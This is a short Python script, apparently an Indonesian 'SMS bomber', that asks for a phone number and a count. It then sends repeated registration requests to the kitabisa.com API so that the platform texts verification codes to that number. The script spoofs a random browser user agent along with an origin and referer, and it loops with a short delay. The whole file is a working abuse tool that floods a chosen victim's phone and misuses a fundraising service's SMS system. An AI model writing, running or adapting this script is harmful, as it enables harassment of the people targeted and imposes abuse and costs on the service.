import os,requests,time,json
from fake_useragent import UserAgent
head = {
	'Host':'core.ktbs.io',
	'accept':'application/json',
	'content-type':'application/x-www-form-urlencoded',
	'user-agent':UserAgent().random,
	'version':'3.4.0',
	'origin':'https://kitabisa.com',
	'sec-fetch-site':'cross-site',
	'sec-fetch-mode':'cors',
	'referer':'https://kitabisa.com/register',
	'accept-encoding':'gzip, deflate, br',
	'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
}
url = 'https://core.ktbs.io/v2/user/registration/temp'

class KitaBisa:
	def __init__(self,nomor,jumlah):
		self.nomor = nomor
		self.jumlah = jumlah
		self.delay = 2
		self.data = {
			'full_name':'RidhoGans',
			'user_id':self.nomor,
			'user_id_type':'phone_number'
		}
		self.otw()
	def otw(self):
		for i in range(1,int(self.jumlah)+1):
			r = requests.post(url,headers=head,json=self.data)
			print (r.text)
			time.sleep(self.delay)
while True:
	try:
		nomor = input('\033[96m[+]\033[0m No Hp : ')
		if nomor == '':
			print ('\033[91m[!]\033[0m Jangan Kosong Gan!')
			break
		jumlah = input("\033[96m[+]\033[0m Jumlah : ")
		if jumlah == '':
			print ('\033[91m[!]\033[0m Jangan Kosong Gan!')
			break
		KitaBisa(nomor,jumlah)
		exit()
	except KeyboardInterrupt:
		exit('\n')
	except Exception as A:
		print (f"[Err]: {A}")
